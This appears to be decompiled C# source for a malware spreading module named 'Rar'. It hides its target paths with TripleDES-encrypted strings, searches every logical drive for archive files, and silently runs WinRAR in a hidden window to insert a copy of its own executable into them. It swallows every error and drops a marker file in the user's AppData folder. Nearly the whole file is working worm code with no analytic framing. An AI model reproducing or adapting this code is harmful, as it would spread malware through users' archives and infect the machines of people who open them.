using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

public class Rar
{
	private static string _rarPath;

	private static string _copiedExeName;

	public static bool Check()
	{
		if (Directory.Exists(Class1.TripleDES("R227vsg+VV/UXlW05yo33w==", "SU1rRzYTBez", d: true)))
		{
			return true;
		}
		return false;
	}

	public static void INF(string path)
	{
		try
		{
			if (Check())
			{
				ZipSpread(Class1.TripleDES("LscS7pGUDAY=", "SuaW6so8lzw", d: true), path);
			}
			else
			{
				ZipSpread(Class1.TripleDES("Ez6ja6bN8R4=", "Su9JGi4bXSp", d: true), path);
			}
			Spread(path);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ZipSpread(string MainDir, string YourFile)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		ListBox val = new ListBox();
		try
		{
			string[] directories = Directory.GetDirectories(MainDir);
			foreach (string text in directories)
			{
				string[] files = Directory.GetFiles(text, Class1.TripleDES("OvxyKj0n9Tk=", "S7CSyoLICOV", d: true));
				foreach (string text2 in files)
				{
					val.get_Items().Add((object)text2);
				}
				ZipSpread(text, YourFile);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val.get_Items().GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = folderPath + Class1.TripleDES("KHd9KVOaiPTyRWT5fny+2Q==", "SejgdH8ov4D", d: true);
				processStartInfo.Arguments = " a " + objectValue.ToString() + " " + YourFile;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	private static void Search(string pathName)
	{
		string[] files = Directory.GetFiles(pathName);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(Class1.TripleDES("b8HFrUZHwe0=", "So1ei8ZZ0oP", d: true)))
			{
				RarStart(text);
			}
			if (text.Contains(Class1.TripleDES("Gg23sNBOOfA=", "SM9Ad3kpLwG", d: true)))
			{
				RarStart(text);
			}
		}
		string[] directories = Directory.GetDirectories(pathName);
		string[] array2 = directories;
		foreach (string pathName2 in array2)
		{
			Search(pathName2);
		}
	}

	public static void Spread(string myExeName)
	{
		_copiedExeName = myExeName;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string pathName in array)
		{
			Search(pathName);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class1.TripleDES("YlKwCwOY8BZ9w6frhqzG4A==", "SF3JAYT4jVP", d: true));
	}

	public static void RarStart(string archiveToInject)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		_rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class1.TripleDES("/KQ53sg030ghIBrP4K3fymyjWvnLmRfI", "S5ZWWDTJktD", d: true);
		if (File.Exists(_rarPath))
		{
			if (!File.Exists(Path.Combine(path, _copiedExeName)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, _copiedExeName));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, _copiedExeName), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			object obj = new StringBuilder(255);
			GetShortPathName(archiveToInject, (StringBuilder)obj, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = Conversions.ToString(Operators.AddObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" a ", obj), (object)" "), (object)text));
				processStartInfo.FileName = _rarPath;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
